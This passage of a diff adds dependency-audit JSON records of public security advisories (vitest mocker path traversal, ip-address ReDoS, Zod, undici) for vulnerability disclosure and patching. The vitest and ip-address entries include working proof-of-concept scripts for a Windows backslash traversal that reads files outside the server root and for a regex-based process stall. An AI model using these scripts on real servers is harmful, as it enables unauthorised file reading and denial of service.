+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe path traversal fix released for [GHSA-82fw-gwwq-j7x9](https://github.com/vitest-dev/vitest/security/advisories/GHSA-82fw-gwwq-j7x9) can be bypassed on Windows by using a backslash in the redirect URL pathname.\n\nThe fixed code joins an attacker-controlled URL pathname with the Vite root using `node:path/posix`, then passes that string to Vite's file allowlist check. On Windows, a value such as `C:/project/root/..\\secret.txt` retains `..\\` during the POSIX join and begins with the allowed root, so the allowlist accepts it. The later `readFile()` call uses Windows filesystem semantics, where the backslash is a path separator, and reads the sibling file outside the configured root.\n\nI reproduced the issue with the published `@vitest/mocker` packages in both fixed release lines:\n\n- `@vitest/mocker@4.1.11`\n- `@vitest/mocker@5.0.0`\n\nThe current `main` source at commit `2ce29d5fa758046e5453bd92b8ed6c9da9709bb5` has the same behavior.\n\n## Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. The redirect registration now converts backslashes in the URL pathname to forward slashes before it joins the pathname with the root, so `..\\` resolves the same as `../` and the allowlist check rejects it.\n\n## Relationship to GHSA-82fw-gwwq-j7x9\n\nThis is a bypass of the accepted fix, not a separate unrelated path. It uses the same `vitest:interceptor:register` redirect registration and the same file-reading sink as the original advisory. A forward-slash traversal is rejected after the fix, while the equivalent Windows backslash traversal is accepted.\n\nThe original advisory marks 4.1.11 and 5.0.0-rc.2 as patched. The newly affected ranges introduced by the incomplete fix are therefore:\n\n- `4.1.11`\n- `>=5.0.0-rc.2, <5.0.3`\n\nOlder affected releases remain covered by GHSA-82fw-gwwq-j7x9.\n\n## Root cause\n\n`packages/mocker/src/node/interceptorPlugin.ts` imports `join` from `node:path/posix`. Redirect registration currently performs the equivalent of:\n\n```ts\nconst redirect = join(server.config.root, redirectUrl.pathname)\nif (!isFileLoadingAllowed(server.config, redirect)) return\nevent.redirect = redirect\n```\n\nThe registered value later reaches:\n\n```ts\nreadFile(mock.redirect, 'utf-8')\n```\n\nVite's allowlist check expects a normalized absolute filesystem path. On Windows, POSIX joining does not normalize backslashes, but `readFile` interprets them as separators. The check and the sink therefore interpret the same string differently.\n\nThe authenticated browser RPC fallback in `packages/browser/src/node/rpc.ts` is not affected: it joins the path with `pathe`, which converts backslashes to forward slashes before the access check. The reproduction below targets the public mocker WebSocket registration path.\n\n## Preconditions and impact\n\nA client that can reach a Vite server using the public `mockerPlugin` or standalone `interceptorPlugin` WebSocket registration can register a redirect mock. On Windows, the client can then request the registered module and read a file outside `server.fs.allow` that the Vitest/Vite process account can access. Vitest Browser Mode does not register these WebSocket handlers in the affected versions.\n\nThe reproduction uses an unauthenticated Vite HMR WebSocket connection and a normal HTTP GET. It does not call the plugin's internal transform API. The practical network reachability is the same deployment precondition described by the original advisory; default loopback-only development servers are correspondingly less exposed.\n\n## Reproduction\n\nTested on GitHub-hosted Windows Server 2025 with Node.js 22. The test creates only temporary synthetic files: a Vite root directory and a sibling `secret.txt` containing a canary.\n\nInstall dependencies for either affected line:\n\n```console\nnpm install @vitest/mocker@4.1.11 vite@7.1.5 ws@8.18.3\n# or\nnpm install @vitest/mocker@5.0.0 vite@7.1.5 ws@8.18.3\nnode poc.mjs\n```\n\n`poc.mjs`:\n\n```js\nimport { mkdir, writeFile } from 'node:fs/promises'\nimport { join } from 'node:path'\nimport { tmpdir } from 'node:os'\nimport { randomUUID } from 'node:crypto'\nimport { interceptorPlugin } from '@vitest/mocker/node'\nimport { createServer } from 'vite'\nimport { WebSocket } from 'ws'\n\nconst base = join(tmpdir(), `vitest-path-${randomUUID()}`)\nconst root = join(base, 'root')\nconst secret = join(base, 'secret.txt')\nawait mkdir(root, { recursive: true })\nawait writeFile(secret, 'SYNTHETIC_OUTSIDE_ROOT_CANARY')\n\nconst server = await createServer({\n  root,\n  configFile: false,\n  logLevel: 'silent',\n  server: { fs: { allow: [root] } },\n  plugins: [\n    {\n      name: 'validation:virtual-modules',\n      enforce: 'pre',\n      resolveId(id) {\n        if (id === '/control' || id === '/bypass') return id\n      },\n    },\n    interceptorPlugin(),\n  ],\n})\n\nawait server.listen()\nconst port = new URL(server.resolvedUrls.local[0]).port\nconst baseUrl = server.resolvedUrls.local[0]\n\nfunction register(id, redirect) {\n  return new Promise((resolve, reject) => {\n    const socket = new WebSocket(`ws://localhost:${port}`, 'vite-hmr')\n    const timer = setTimeout(() => reject(new Error('registration timeout')), 5000)\n    socket.on('message', (raw) => {\n      let message\n      try { message = JSON.parse(raw.toString()) } catch { return }\n      if (message.type === 'custom' && message.event === 'vitest:interceptor:register:result') {\n        clearTimeout(timer)\n        socket.close()\n        resolve()\n      }\n    })\n    socket.on('open', () => socket.send(JSON.stringify({\n      type: 'custom',\n      event: 'vitest:interceptor:register',\n      data: { type: 'redirect', raw: '', id, url: id, redirect },\n    })))\n    socket.on('error', reject)\n  })\n}\n\ntry {\n  await register('/control', 'traversal:../secret.txt')\n  const controlResponse = await fetch(new URL('/control', baseUrl))\n  const controlBody = await controlResponse.text()\n\n  await register('/bypass', 'traversal:..\\\\secret.txt')\n  const bypassResponse = await fetch(new URL('/bypass', baseUrl))\n  const bypassBody = await bypassResponse.text()\n\n  const result = {\n    platform: process.platform,\n    root,\n    outsideFile: secret,\n    slashTraversalStatus: controlResponse.status,\n    slashTraversalRejected: !controlBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),\n    backslashTraversalStatus: bypassResponse.status,\n    backslashTraversalReturnedOutsideCanary: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY'),\n    returnedBody: bypassBody.includes('SYNTHETIC_OUTSIDE_ROOT_CANARY') ? 'SYNTHETIC_OUTSIDE_ROOT_CANARY' : null,\n    expectedBackslashTraversalBlocked: process.env.EXPECT_BLOCKED === '1',\n  }\n  console.log(JSON.stringify(result, null, 2))\n  const backslashResultMatchesExpectation = result.expectedBackslashTraversalBlocked\n    ? !result.backslashTraversalReturnedOutsideCanary\n    : result.backslashTraversalReturnedOutsideCanary\n  if (!result.slashTraversalRejected || !backslashResultMatchesExpectation) process.exitCode = 1\n} finally {\n  await server.close()\n}\n```\n\nObserved with `@vitest/mocker@4.1.11`:\n\n```json\n{\n  \"platform\": \"win32\",\n  \"slashTraversalStatus\": 404,\n  \"slashTraversalRejected\": true,\n  \"backslashTraversalStatus\": 200,\n  \"backslashTraversalReturnedOutsideCanary\": true,\n  \"returnedBody\": \"SYNTHETIC_OUTSIDE_ROOT_CANARY\",\n  \"expectedBackslashTraversalBlocked\": false\n}\n```\n\nThe same result was observed with `@vitest/mocker@5.0.0`.\n\nThis includes two useful controls:\n\n1. `traversal:../secret.txt` is rejected and returns 404, confirming the published forward-slash fix is active.\n2. `traversal:..\\secret.txt` returns 200 and the exact outside-root canary, confirming a Windows separator bypass rather than an unrelated route or fixture response.",
+      "reported_by": null,
+      "title": "Vitest: Windows backslash traversal bypasses the @vitest/mocker redirect allowlist fix",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112950"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=4.1.11 <4.1.12",
+      "github_advisory_id": "GHSA-xp26-3454-mjgp",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:48:39.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-xp26-3454-mjgp"
+    },
+    "1242883": {
+      "findings": [
+        {
+          "version": "10.7.3",
+          "paths": [
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "cli > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "packages/paperclip-runner > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "packages/paperclip-runner > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "server > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @agentclientprotocol/claude-agent-acp@0.73.0 > @anthropic-ai/claude-agent-sdk@0.3.280 > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3",
+            "ui > @paperclipai/adapter-claude-local@link:../packages/adapters/claude-local > @modelcontextprotocol/sdk@1.31.0 > express-rate-limit@8.7.1 > ip-address@10.7.3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/beaugunderson/ip-address/security/advisories/GHSA-rxp7-6hxx-x8q5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-111997\n- https://github.com/beaugunderson/ip-address/commit/ec80fcd5d7b97defecfd39717d782a9f9f8b89dd\n- https://github.com/beaugunderson/ip-address/releases/tag/v10.7.4\n- https://github.com/advisories/GHSA-rxp7-6hxx-x8q5",
+      "created": "2026-10-22T16:19:39.000Z",
+      "id": 1242883,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`new Address6()` and `Address6.isValid()` strip a zone identifier with the pattern `/%.*$/` before they apply the 45-character length limit. When the string holds many `%` characters followed by a line terminator, the pattern is retried from every `%` and each attempt scans to the line terminator before failing, so rejecting the string takes time proportional to the square of its length. 10,000 `%` characters and a newline take 41 ms, 40,000 take 632 ms and 100,000 take 3.9 s of synchronous work. The same strings without the newline are rejected in under a millisecond.\n\nAn application that validates an attacker-supplied string with these methods can be stalled by a single long request. The input is rejected with the correct `AddressError`; the cost of reaching that rejection is the defect.\n\n### Details\n\nThe constructor in `src/ipv6.ts` removes the CIDR suffix, then the zone, then checks the length of what is left:\n\n```ts\nconst zone = constants6.RE_ZONE_STRING.exec(address);\n\nif (zone) {\n  this.zone = zone[0];\n\n  address = address.replace(constants6.RE_ZONE_STRING, '');\n}\n\nconst longest = this.groups * 5 + 5;\n\nif (address.length > longest) {\n  throw new AddressError(`IPv6 addresses are at most ${longest} characters.`);\n}\n```\n\n`RE_ZONE_STRING` is `/%.*$/`. It has no anchor at its start, `.` does not match a line terminator (`\\n`, `\\r`, U+2028 or U+2029), and without the `m` flag `$` matches only at the end of the input. For `%` repeated N times and then `\\n`, the engine starts a match at the first `%`, `.*` consumes the remaining `%` characters up to the newline, `$` fails there, and backtracking through every shorter `.*` fails too. The engine then starts again at the second `%`, and so on: N starts, each proportional to N. The length limit that follows rejects the string in constant time, after the scan has already run.\n\nThe line terminator need not be last. Any string in which many `%` characters precede a line terminator behaves the same way.\n\nEvery entry point that passes a caller's string to the `Address6` constructor is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromWildcard()` rejects a `%` before it constructs anything, `fromURL()` admits only hex digits, colons and dots in a host, and `fromArpa()` checks the nibble grammar first, so those three are unaffected. `Address4` has no zone and is unaffected.\n\n### Affected versions\n\n`<= 10.7.3`. The zone pattern has been in the constructor since 1.0.0; 5.9.4, 9.0.5 and 10.7.0 show the same timings as 10.7.3.\n\n### Impact\n\n`Address6.isValid()` on N `%` characters and a newline, measured on ip-address 10.7.3 and node 24.21.0:\n\n| Input | Wall time | Same length of `!` |\n|---|---|---|\n| 5,461 characters | 13 ms | 0.1 ms |\n| 16 KiB | 108 ms | 0.1 ms |\n| 100 KB | 3.9 s | 0.1 ms |\n| 256 KiB | 27 s | 0.2 ms |\n\nThe parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. No memory is retained and the process resumes when the call returns.\n\n### Reachability\n\nThe input needs a line terminator after the `%` characters, which decides where it can arrive. An HTTP header value cannot carry a carriage return or a line feed, so a host or address taken from a header does not reach this. A URL can carry both characters percent-encoded at three bytes each, and Node's default 16 KB limit on the request line and headers admits about 5,461 of them: 13 ms. A request body is where the larger sizes come from. Common body parsers default to between 100 KB and 1 MB, and at 100 KB one field passed to the parser unchecked blocks the process for 3.9 s.\n\n### Proof of concept\n\n`npm i ip-address@10.7.3`, then:\n\n```js\nconst { Address6 } = require('ip-address');\n\nfunction time(input) {\n  const start = process.hrtime.bigint();\n\n  Address6.isValid(input);\n\n  return `${(Number(process.hrtime.bigint() - start) / 1e6).toFixed(1)} ms`;\n}\n\nfor (const n of [10000, 20000, 40000, 100000]) {\n  console.log(`${n}: ${time(`${'%'.repeat(n)}\\n`)}, without the newline ${time('%'.repeat(n))}`);\n}\n```\n\nOn affected versions (node 24.21.0):\n\n```\n10000: 41.0 ms, without the newline 0.0 ms\n20000: 161.1 ms, without the newline 0.0 ms\n40000: 632.4 ms, without the newline 0.1 ms\n100000: 3899.8 ms, without the newline 0.1 ms\n```\n\nEach doubling of the input multiplies the time by four.\n\n### Remediation\n\nUpgrade to the patched release. In the fix, the constructor finds the zone by the index of the first `%` and accepts the remainder as a zone only when it holds no line terminator, which reads the input once. 1 MiB of the input above is rejected in about a millisecond. Every address that parsed before parses to the same result, and a string with a line terminator after a `%` is rejected as it was.\n\n`RE_ZONE_STRING` stays exported from `v6/constants` for code that imports it directly and is marked `@deprecated`; the library itself does not call it.\n\nIf you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:\n\n```js\nif (host.length > 64) throw new Error('not an IP address');\n```",
+      "reported_by": null,
+      "title": "ip-address: Address6 matches a zone identifier in quadratic time ahead of its length limit, allowing a single long string to stall the process",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-111997"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "ip-address",
+      "vulnerable_versions": "<=10.7.3",
+      "github_advisory_id": "GHSA-rxp7-6hxx-x8q5",
+      "recommendation": "Upgrade to version 10.7.4 or later",
+      "patched_versions": ">=10.7.4",
+      "updated": "2026-10-22T16:19:41.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-rxp7-6hxx-x8q5"
+    },
+    "1243066": {
+      "findings": [
+        {
+          "version": "3.25.76",
+          "paths": [
+            "cli > @paperclipai/adapter-cursor-cloud@link:../packages/adapters/cursor-cloud > @cursor/sdk@1.0.36 > zod@3.25.76",
+            "cli > @paperclipai/server@link:../server > @paperclipai/adapter-cursor-cloud@link:../packages/adapters/cursor-cloud > @cursor/sdk@1.0.36 > zod@3.25.76",
+            "packages/adapters/cursor-cloud > @cursor/sdk@1.0.36 > zod@3.25.76",
+            "server > @paperclipai/adapter-cursor-cloud@link:../packages/adapters/cursor-cloud > @cursor/sdk@1.0.36 > zod@3.25.76",
+            "ui > @paperclipai/adapter-cursor-cloud@link:../packages/adapters/cursor-cloud > @cursor/sdk@1.0.36 > zod@3.25.76"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+      "created": "2026-10-01T18:32:46.000Z",
+      "id": 1243066,
+      "npm_advisory_id": null,
+      "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+      "reported_by": null,
+      "title": "Zod can exhaust memory while validating oversized constrained collections",
+      "metadata": null,
+      "cves": [
+        "CVE-2023-54404"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "zod",
+      "vulnerable_versions": "<4.6.6",
+      "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+      "recommendation": "Upgrade to version 4.6.6 or later",
+      "patched_versions": ">=4.6.6",
+      "updated": "2026-10-23T18:26:52.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+    },
+    "1243077": {
+      "findings": [
+        {
+          "version": "8.10.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > jsdom@30.0.1 > undici@8.10.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-4qv8-2p9j-2685\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109924\n- https://github.com/nodejs/undici/commit/299162740d5f39120092277e70efacb4d151c1c6\n- https://github.com/nodejs/undici/commit/789ef26461c648480433846607154f52d74ec9ab\n- https://github.com/nodejs/undici/commit/c43b23fdc6b37e1283d4347408bb16800f867d9e\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-4qv8-2p9j-2685",
+      "created": "2026-10-23T22:13:29.000Z",
+      "id": 1243077,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `EventSource` client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed `data:` fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based `maxEventSize` and `maxResponseSize` limits do not bound that retained state, and `maxResponseSize` is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an `EventSource` connection to an untrusted peer, which controls only the response. Availability is the only impact.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which bound the retained EventSource parser state (the number of `data` fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unbounded memory in the EventSource parser",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109924"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
+      "github_advisory_id": "GHSA-4qv8-2p9j-2685",
+      "recommendation": "Upgrade to version 8.12.2 or later",
+      "patched_versions": ">=8.12.2",
+      "updated": "2026-10-23T22:13:31.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-4qv8-2p9j-2685"
+    },
+    "1243079": {
+      "findings": [
+        {
+          "version": "6.28.1",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "cli > @paperclipai/server@link:../server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "cli > @paperclipai/server@link:../server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > undici@6.28.1",
+            "cli > @paperclipai/server@link:../server > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1",
+            "server > @chat-adapter/discord@4.39.0 > discord.js@14.27.0 > undici@6.28.1",
+            "server > @discordjs/ws@1.2.3 > @discordjs/rest@2.6.3 > undici@6.28.1"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-4qv8-2p9j-2685\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109924\n- https://github.com/nodejs/undici/commit/299162740d5f39120092277e70efacb4d151c1c6\n- https://github.com/nodejs/undici/commit/789ef26461c648480433846607154f52d74ec9ab\n- https://github.com/nodejs/undici/commit/c43b23fdc6b37e1283d4347408bb16800f867d9e\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v6.29.1\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-4qv8-2p9j-2685",
+      "created": "2026-10-23T22:13:29.000Z",
+      "id": 1243079,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `EventSource` client can be driven to exhaust process memory by a malicious or compromised Server-Sent Events peer. By sending millions of tiny completed `data:` fields with no blank event separator, or a single unfinished line split across many chunks, the parser retains a growing amount of per-field and per-chunk state. The byte-based `maxEventSize` and `maxResponseSize` limits do not bound that retained state, and `maxResponseSize` is enforced on the compressed body before decompression, so a small compressed response can expand into enough retained memory to terminate the process. The application only needs to maintain an `EventSource` connection to an untrusted peer, which controls only the response. Availability is the only impact.\n\n### Patches\n\nUpgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which bound the retained EventSource parser state (the number of `data` fields and buffered chunks, the unfinished-line length, and per-field byte totals) independently of the byte limits.\n\n### Workarounds\n\nNone.",
+      "reported_by": null,
+      "title": "undici vulnerable to Denial of Service via unbounded memory in the EventSource parser",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109924"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=6.5.0 <6.29.1",
+      "github_advisory_id": "GHSA-4qv8-2p9j-2685",
+      "recommendation": "Upgrade to version 6.29.1 or later",
+      "patched_versions": ">=6.29.1",
+      "updated": "2026-10-23T22:13:31.000Z",
+      "cvss": {
+        "score": 5.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-4qv8-2p9j-2685"
+    },
+    "1243080": {
+      "findings": [
+        {
+          "version": "8.10.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "cli > @paperclipai/server@link:../server > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "server > jsdom@30.0.1 > undici@8.10.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > jsdom@30.0.1 > undici@8.10.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-f72v-6w45-q472\n- https://nvd.nist.gov/vuln/detail/CVE-2026-109841\n- https://github.com/nodejs/undici/commit/18bc8a1e09d15bc45815154a289dcf6fd5254d00\n- https://github.com/nodejs/undici/commit/4f7ef6806e532ab9e29ccd6229b1b9d241e1b1f0\n- https://cna.openjsf.org/security-advisories.html\n- https://github.com/nodejs/undici/releases/tag/v7.30.1\n- https://github.com/nodejs/undici/releases/tag/v8.12.2\n- https://github.com/advisories/GHSA-f72v-6w45-q472",
+      "created": "2026-10-23T22:12:57.000Z",
+      "id": 1243080,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nundici's `fetch()` verifies Subresource Integrity (SRI) metadata by looking up the algorithm token in a lowercase-only set, but the SRI specification defines a valid token by its ASCII-lowercase form. A correct but non-lowercase token such as `SHA256-...` or `Sha256-...` is therefore treated as unknown and skipped. When no recognized algorithm remains, undici treats the integrity list as empty and accepts the response, so a server that returns a body different from the pinned digest passes the check.\n\nAn application that pins a response with a valid uppercase or mixed-case SRI token receives attacker-controlled bytes with no integrity error. The attacker needs only to control the response body, not the application's integrity metadata. The issue affects response integrity only. The regression was introduced in undici 7.15.0; releases 7.14.0 and earlier lowercase the token and are not affected.\n\n### Patches\n\nUpgrade to `7.30.1` or `8.12.2`. undici now normalizes the algorithm token to ASCII lowercase before validating it and before selecting the strongest algorithm, so case variants of SHA-256, SHA-384, and SHA-512 are verified correctly.\n\n### Workarounds\n\nUse lowercase algorithm tokens (`sha256`, `sha384`, `sha512`) in `integrity` metadata.",
+      "reported_by": null,
+      "title": "undici vulnerable to Subresource Integrity bypass via non-lowercase algorithm tokens",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-109841"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "undici",
+      "vulnerable_versions": ">=8.0.0 <8.12.2",
